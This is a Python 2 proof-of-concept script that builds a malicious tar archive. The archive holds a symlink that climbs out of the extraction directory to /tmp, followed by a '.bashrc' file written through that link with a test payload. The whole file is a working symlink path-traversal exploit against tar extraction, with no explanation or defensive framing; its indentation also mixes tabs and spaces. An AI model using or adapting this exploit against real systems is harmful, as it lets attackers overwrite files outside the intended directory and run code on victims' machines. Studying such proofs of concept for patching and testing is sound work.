import time
import tarfile
import StringIO
from tarfile import DIRTYPE, SYMTYPE, REGTYPE


if __name__ == '__main__':
	with tarfile.open("poc.tar", "w") as tar:
		tarinfo = tarfile.TarInfo('baddir')
		tarinfo.type = DIRTYPE
		tarinfo.mode = 0755
		tarinfo.uname = 'root'
		tarinfo.gname = 'root'
		tarinfo.uid = 0
		tarinfo.gid = 0
		tarinfo.mtime = time.time()
		tar.addfile(tarinfo)

                tarinfo = tarfile.TarInfo('baddir/sym')
                tarinfo.type =  SYMTYPE
                tarinfo.mode = 0777
                tarinfo.uname = 'root'
                tarinfo.gname = 'root'
                tarinfo.uid = 0
                tarinfo.gid = 0
                tarinfo.mtime = time.time()
		tarinfo.linkname = '../../../../../../../../../../../tmp'
                tar.addfile(tarinfo)

                tarinfo = tarfile.TarInfo('baddir/sym/.bashrc')
		contents = 'echo "***pwn***"\n'
                tarinfo.type = REGTYPE
                tarinfo.mode = 0644
                tarinfo.uname = 'root'
                tarinfo.gname = 'root'
                tarinfo.uid = 0
                tarinfo.gid = 0
                tarinfo.mtime = time.time()
		string = StringIO.StringIO(contents)
		tarinfo.size = len(contents)
		tar.addfile(tarinfo, string)
